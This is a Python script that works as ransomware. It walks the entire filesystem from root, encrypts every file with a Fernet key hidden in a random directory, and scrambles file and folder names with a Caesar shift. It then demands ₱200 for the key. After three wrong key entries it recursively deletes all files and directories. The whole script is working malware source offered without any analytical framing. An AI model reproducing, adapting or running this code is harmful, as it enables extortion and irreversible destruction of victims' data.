import os, shutil, random, string
from cryptography.fernet import Fernet

# Caesar Cipher

def caesar(cName):
	char = string.printable
	c = cName
	crypto = ''
	
	for i in c:
		if i in char:
			x = char.index(i, 0)
			y = char.index(i, 0)
			y += 1
			x += 5
			try:
				crypto += char[x]
			except:
				crypto += char[y]
		else:
			crypto += i 
			
	return crypto

def dCaesar(cName):
	char = string.printable
	c = cName
	decrypt = ''
	
	for i in c:
		if i in char:
			x = char.index(i, 0)
			x -= 5
			decrypt += char[x]
		else:
			decrypt += i
	
	return decrypt

#Root

def root():
	os.chdir('/') 
	return os.getcwd()

root()

# Data

key = ''
password = 'Rei'
x = 1
main = True 
f = []

# Encrypting

def encrypt():
	
	key = Fernet.generate_key()
	
	iPath = []
		
	for path, dir, files in os.walk(os.getcwd()):
		iPath.append(path)
		
	def fPath():
		nPath = random.choice(iPath)
		return nPath 
	
	if os.getcwd() in iPath:
		iPath.remove(os.getcwd())
		
	os.chdir(fPath())
	
	
	with open('key.key', 'wb') as k:
		k.write(key)
	
	root() 
		
	for path, dir, files in os.walk(os.getcwd()):
		os.chdir(path)
		
		for file in files:
			if file == 'main.py' or file == 'key.key':
				continue
			with open(file, 'rb') as f:
				data = f.read()
			encrypted = Fernet(key).encrypt(data)
			with open(file, 'wb') as f:
				f.write(encrypted)
	root()
	
	def cName():
		for path, dir, files in os.walk(os.getcwd(), topdown = False):
			os.chdir(path)
			for i in dir:
				os.rename(i, caesar(i))
			
			for i in files:
				if i == 'key.key':
					continue
				x, y = os.path.splitext(i)
				x = caesar(x)
				nName = x + y
				os.rename(i, nName)
	cName() 
	
	root() 
	
	print('Your files are now encrypted.')
	print('Enter the key to decrypt them.')
	print() 

# Decrypting

def decrypt():
	
	for path, dir, files in os.walk(os.getcwd()):
		os.chdir(path)
		
		for i in files:
			if i == 'key.key':
				with open(i, 'rb') as k:
					key = k.read()
	root() 
		
	for path, dir, files in os.walk(os.getcwd()):
		os.chdir(path)
		
		for file in files:
			if file == 'main.py' or file == 'key.key':
				continue
			with open(file, 'rb') as f:
				data = f.read()
			decrypted = Fernet(key).decrypt(data)
			with open(file, 'wb') as f:
				f.write(decrypted) 
	root()
	
	for path, dir, files in os.walk(os.getcwd()):
		os.chdir(path)
		
		for file in files:
			if file == 'key.key':
				os.remove(file)
			else:
				pass
	root()
	
	for path, dir, files in os.walk(os.getcwd(), topdown = False):
		os.chdir(path)
		
		for i in dir:
			os.rename(i, dCaesar(i))
			
		for i in files:
			x, y = os.path.splitext(i)
			x = dCaesar(x)
			nName = x + y
			os.rename(i, nName)
			
root()

if __name__ == '__main__':
	
	for path, dir, files in os.walk(os.getcwd()):
		for i in files:
			f.append(i)
	
	isEncrypted = 'key.key' in f
	
	if isEncrypted:
		pass
	else:
		encrypt() 
	
print('Warning:')
print('Three Incorrect Keys will delete your files.')
print()

print('Buy the Key for ₱200 or else Good Luck!') 

while main:
	key = input('Enter Key: ')
	
	if key == password:
		decrypt()
		print('Files have been decrypted.')
		main = False
	elif key != password and x < 3:
		print('Incorrect Key!')
		print()
		x += 1 
	else:
		for path, dir, files in os.walk(os.getcwd()):
			os.chdir(path)
			
			for i in dir:
				try:
					shutil.rmtree(i)
				except:
					pass
			
			for i in files:
				try:
					os.remove(i)
				except:
					pass 
			
			print('Files have been deleted.')
			
			main = False 